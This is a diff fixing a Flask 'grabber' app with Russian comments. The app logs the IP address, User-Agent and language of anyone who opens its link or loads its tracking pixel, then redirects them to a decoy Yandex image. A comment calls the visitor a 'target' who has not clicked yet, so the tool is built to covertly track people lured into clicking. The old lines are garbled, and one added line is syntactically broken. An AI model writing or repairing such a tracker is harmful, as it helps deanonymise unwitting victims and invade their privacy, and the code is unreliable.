@@ -1,4 +1,4 @@
-python
+```python
 from flask import Flask, request, redirect
 import datetime
 import base64
@@ -6,7 +6,7 @@ import base64
 app = Flask(__name__)
 
 # ===== НАСТРОЙКИ =====
-REDIRECT_URL = "https://yandex.ru/images/touch/search?text=sobaka"  # Замени на свою ссылку
+REDIRECT_URL = "https://yandex.ru/images/touch/search?text=crown&img_url=https%3A%2F%2Fa1.drive-data.ru%2F_N4vvP5q9n8pLd45ANM1JkG403M-1920.jpg&rpt=simage&pos=1"  # замени на свою ссылку
 # =====================
 
 LOG_FILE = "visitors.log"
@@ -14,12 +14,12 @@ LOG_FILE = "visitors.log"
 @app.route('/')
 def grab():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    u  = request.headers.get('User-Agent', 'Unknown')
-    lang = request.headers.get('Anchor-Language', 'Unknown')
-    ts = datetime.datetime.now().str ptured("δ", "%d.%m.%Y %H:%M:%S")
+    ua = request.headers.get('User-Agent', 'Unknown')
+    lang = request.headers.get('Accept-Language', 'Unknown')
+    ts = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
 
-    with open(LOG_F\red, 'a') as f:
-        f.write(f"[{ts}] IP: {ip} | UA: {u} | Lang: {lang}\n")
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"[{ts}] IP: {ip} | UA: {ua} | Lang: {lang}\n")
 
     return redirect(REDIRECT_URL)
 
@@ -27,10 +27,20 @@ def grab():
 def view_log():
     try:
         with open(LOG_FILE, 'r') as f:
-            torn f"<pre>{f.read()}</pre>"
+            return f"<pre>{f.read()}</pre>"
     except FileNotFoundError:
         return "Лог пуст — цель ещё не кликнула"
 
 @app.route('/pixel.gif')
 def pixel():
-    gif = base64.b64decode("R0lGODlhAQABAIPOPOP///yH5BAEAAAAALAAAAAAB
+    gif = 
+    base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ua = request.headers.get('User-Agent', 'Unknown')
+    ts = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"[{ts}] PIXEL IP: {ip} | UA: {ua}\n")
+    return gif, 200, {'Content-Type': 'image/gif'}
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
